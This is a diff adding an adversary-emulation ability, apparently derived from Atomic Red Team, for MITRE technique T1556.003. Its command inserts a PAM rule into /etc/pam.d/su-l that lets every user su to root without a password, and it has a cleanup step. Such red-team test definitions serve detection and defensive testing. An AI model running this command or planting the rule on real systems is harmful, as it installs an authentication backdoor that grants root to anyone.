@@ -1,0 +1,45 @@
+- id: 4b9dde80-ae22-44b1-a82a-644bf009eb9c
+  name: Malicious PAM rule
+  description: 'Inserts a rule into a PAM config and then tests it.
+
+
+    Upon successful execution, this test will insert a rule that allows every user
+    to su to root without a password.'
+  tactic: credential-access
+  technique:
+    attack_id: T1556.003
+    name: 'Modify Authentication Process: Pluggable Authentication Modules'
+  platforms:
+    linux:
+      sh:
+        command: sudo sed -i "1s,^,auth sufficient pam_succeed_if.so uid >= 0\n,g"
+          /etc/pam.d/su-l
+        cleanup: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}'
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - credential-access
+  - t1556.003
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      path_to_pam_conf:
+        description: PAM config file to modify.
+        type: string
+        default: /etc/pam.d/su-l
+      pam_rule:
+        description: Rule to add to the PAM config.
+        type: string
+        default: auth sufficient pam_succeed_if.so uid >= 0
+      index:
+        description: Index where the rule is inserted.
+        type: integer
+        default: 1
+    technique_created: '2020-06-26T04:01:09.648Z'
+    atomic_guid: 4b9dde80-ae22-44b1-a82a-644bf009eb9c
+    import_timestamp: '2025-06-24T11:15:56.366570Z'
